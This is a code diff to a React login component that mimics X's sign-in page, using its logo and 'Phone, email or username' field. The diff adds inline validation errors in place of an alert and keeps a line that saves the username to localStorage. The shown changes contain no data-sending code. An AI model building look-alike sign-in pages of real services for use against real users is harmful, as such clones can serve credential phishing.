@@ -4,14 +4,17 @@ import xLogo from "../assets/x-logo.png";
 export default function XLogin() {
   const [username, setUsername] = useState("");
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(false);
 
   async function nextStep(e) {
     e.preventDefault();
 
     if (!username.trim()) {
-      alert("Please enter your username, email or phone.");
+      setError(true);
       return;
     }
+
+    setError(false);
 
     localStorage.setItem("x_username", username);
 
@@ -47,9 +50,15 @@ export default function XLogin() {
             type="text"
             placeholder="Phone, email or username"
             value={username}
-            onChange={(e) => setUsername(e.target.value)}
-            className="w-full rounded-md border border-gray-700 bg-black text-white px-4 py-4 outline-none focus:border-blue-500"
+            onChange={(e) => {
+              setUsername(e.target.value);
+              if (error) setError(false);
+            }}
+            className={`w-full rounded-md border bg-black px-4 py-4 text-white outline-none focus:border-blue-500 ${
+              error ? "shake-error border-red-500" : "border-gray-700"
+            }`}
           />
+          {error && <p className="text-sm text-red-500">Please enter your username, email or phone.</p>}
 
           <button
             type="submit"
